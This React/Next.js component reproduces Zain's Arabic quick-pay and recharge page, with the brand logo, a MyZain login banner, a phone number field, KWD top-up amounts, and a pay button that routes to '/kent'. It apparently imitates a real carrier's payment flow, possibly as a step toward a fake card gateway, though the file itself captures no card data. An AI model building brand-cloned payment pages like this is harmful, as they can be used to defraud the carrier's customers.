"use client"

import { useState } from "react"
import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
import { cn } from "@/lib/utils"
import { useRouter } from "next/navigation"

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("recharge")
  const [showAmountDropdown, setShowAmountDropdown] = useState(true)
  const [selectedAmount, setSelectedAmount] = useState("6.000")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedAdOption, setSelectedAdOption] = useState("basic")
  const router=useRouter()
  const amounts = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  const adOptions = [
    { id: "basic", title: "الإعلان الأساسي", price: "5.000", description: "إعلان لمدة 7 أيام" },
    { id: "standard", title: "الإعلان القياسي", price: "10.000", description: "إعلان لمدة 15 يوم مع ميزة التثبيت" },
    {
      id: "premium",
      title: "الإعلان المميز",
      price: "20.000",
      description: "إعلان لمدة 30 يوم مع ميزة التثبيت والظهور في الصفحة الرئيسية",
    },
  ]

  return (
    <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
      {/* Header */}
      <header className="flex items-center justify-between p-4 bg-[#2d1a45]">
        <Menu className="text-white" size={24} />
        <Heart className="text-white" size={24} />
        <div className="bg-white rounded-full p-2">
          <ShoppingCart className="text-[#2d1a45]" size={20} />
        </div>
        <div className="absolute right-16">
          <img src="/placeholder.svg?height=30&width=100" alt="Zain Logo" className="h-7" />
        </div>
      </header>

      {/* Login Banner */}
      <div className="bg-gradient-to-l from-[#2d1a45] to-[#6b2a84] p-4 flex justify-between items-center">
        <button className="bg-[#d13c8c] text-white px-4 py-2 rounded-md text-sm">تسجيل الدخول</button>
        <div className="text-white text-sm text-right">
          <p>يرجى تسجيل الدخول إلى MyZain للحصول على تجربة</p>
          <p>مخصصة</p>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-4">
        <h2 className="text-xl font-bold text-right mb-4">الدفع السريع</h2>

        {/* Tabs */}
        <div className="flex border-b mb-6">
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "bill" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("bill")}
          >
            دفع الفاتورة
          </button>
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "recharge" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("recharge")}
          >
            إعادة تعبئة eeZee
          </button>
        </div>

        {/* Form */}
        <div className="space-y-6">
          <div className="text-right mb-2">
            <p>أريد أن أعيد التعبئة </p>
          </div>

          <div className="relative">
            <div className="flex justify-between items-center border-b pb-2 cursor-pointer" onClick={() => {}}>
              <ChevronDown className="text-[#d13c8c]" />
              <span>رقم آخر</span>
            </div>
          </div>

          <div className="relative">
            <label className="block text-right text-sm mb-1 text-gray-500">* رقم الهاتف</label>
            <input
              type="text"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              className="w-full border-b pb-2 text-right focus:outline-none"
            />
          </div>

          <div className="relative">
            <div className="flex justify-between items-center border-b pb-2">
              <div
                className="flex items-center cursor-pointer"
                onClick={() => setShowAmountDropdown(!showAmountDropdown)}
              >
                <ChevronDown
                  className={`text-[#d13c8c] transition-transform ${showAmountDropdown ? "rotate-180" : ""}`}
                />
                <span className="ml-2">{selectedAmount} د.ك</span>
              </div>
              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
            </div>
            <div className="text-right text-sm text-gray-500 mt-1">الصلاحية 30 يوم</div>

            {/* Dropdown */}
            {showAmountDropdown && (
              <div className="absolute z-10 bg-white shadow-lg w-full mt-2 border rounded">
                {amounts.map((amount) => (
                  <div
                    key={amount.value}
                    className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 ${selectedAmount === amount.value ? "bg-gray-50" : ""}`}
                    onClick={() => {
                      setSelectedAmount(amount.value)
                      setShowAmountDropdown(false)
                    }}
                  >
                    <div className="flex items-center">
                      {selectedAmount === amount.value && (
                        <svg className="w-5 h-5 text-[#d13c8c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                      )}
                      <span className="ml-2">{amount.value} د.ك</span>
                    </div>
                    <span>الصلاحية {amount.validity} يوم</span>
                  </div>
                ))}
                <div className="flex justify-center p-3 cursor-pointer hover:bg-gray-50 border-t">
                  <span className="text-[#d13c8c]">مبلغ آخر</span>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Ad Options Section */}
      <div className="mt-8 p-4 border-t">
        <h2 className="text-xl font-bold text-right mb-4">خيارات الإعلان</h2>
        <div className="space-y-3">
        </div>
        <div className="mt-4">
        </div>
      </div>

      {/* Offers Section */}
      <div className="mt-8 p-4 border-t">
        <div className="flex justify-between items-center">
        <button onClick={()=>{
          router.push('/kent')
        }} className="w-full bg-[#d13c8c] text-white py-3 rounded-md font-medium">دفع</button>
        </div>
      </div>
    </div>
  )
}

